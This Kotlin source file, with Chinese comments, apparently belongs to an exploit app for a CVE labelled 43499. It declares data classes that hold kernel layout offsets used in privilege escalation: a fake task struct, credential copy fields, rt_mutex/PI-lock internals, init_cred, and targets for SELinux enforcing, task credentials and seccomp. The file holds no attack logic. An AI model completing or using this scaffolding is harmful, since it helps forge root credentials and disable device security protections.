package com.ghostlock.app.backend.cve43499.flow

/**
 * native `KernelLayout43499` 的 37 个字段（`attack_contract_fields.def` 顺序）。
 *
 * `slotFakeTask` 的 wire 名仍是 `fakeTask`（def:56/63），Kotlin 改名是为了和
 * [Flow43499Request.Init.fakeTask]（页供地址）区分；编码器必须按 wire 名映射。
 * 所有值都是 native LONG，默认 0 只表示未填，Flow 必须按 present/装配规则拒绝缺项。
 */
data class Flow43499KernelLayout(
    val lock: Long = 0L,
    val waiter: Long = 0L,
    val slotFakeTask: Long = 0L,
    val credCopy: Long = 0L,
    val fopsTable: Long = 0L,
    val owner: Long = 0L,
    val waitLock: Long = 0L,
    val waitList: Long = 0L,
    val listLink: Long = 0L,
    val headWord: Long = 0L,
    val headNext: Long = 0L,
    val headPrev: Long = 0L,
    val pc: Long = 0L,
    val right: Long = 0L,
    val left: Long = 0L,
    val task: Long = 0L,
    val waiterLock: Long = 0L,
    val wakeState: Long = 0L,
    val waiterPrioOffset: Long = 0L,
    val deadline: Long = 0L,
    val wwCtx: Long = 0L,
    val usage: Long = 0L,
    val taskPrioOffset: Long = 0L,
    val normalPrio: Long = 0L,
    val piLock: Long = 0L,
    val piWaiters: Long = 0L,
    val piTopTask: Long = 0L,
    val piBlockedOn: Long = 0L,
    val group: Long = 0L,
    val taskUsage: Long = 0L,
    val taskPrio: Long = 0L,
    val waiterPrio: Long = 0L,
    val initTask: Long = 0L,
    val rootTaskGroup: Long = 0L,
    val initCred: Long = 0L,
    val securityHookHeads: Long = 0L,
    val pointerBytes: Int = 0,
)

/** native `CredentialLayout43499` 的 15 个字段。 */
data class Flow43499CredentialLayout(
    val copySize: Long = 0L,
    val usageOffset: Long = 0L,
    val usageValue: Long = 0L,
    val capsOffset: Long = 0L,
    val capsCount: Long = 0L,
    val capsValue: Long = 0L,
    val refOffset0: Long = 0L,
    val refOffset1: Long = 0L,
    val refOffset2: Long = 0L,
    val refOffset3: Long = 0L,
    val refImage0: Long = 0L,
    val refImage1: Long = 0L,
    val refImage2: Long = 0L,
    val refImage3: Long = 0L,
    val refCount: Int = 0,
)

/** one `TargetOffsets43499` field: Offset/Value/Present/Width are distinct. */
data class Flow43499TargetField(
    val offset: Long = 0L,
    val value: Long = 0L,
    val present: Boolean = false,
    val width: Int = 0,
)

/** native `TargetOffsets43499` 的 5×4 字段。 */
data class Flow43499TargetOffsets(
    val selinuxEnforcingImage: Flow43499TargetField = Flow43499TargetField(),
    val taskCred: Flow43499TargetField = Flow43499TargetField(),
    val taskRealCred: Flow43499TargetField = Flow43499TargetField(),
    val taskAtomicFlags: Flow43499TargetField = Flow43499TargetField(),
    val taskSeccomp: Flow43499TargetField = Flow43499TargetField(),
)
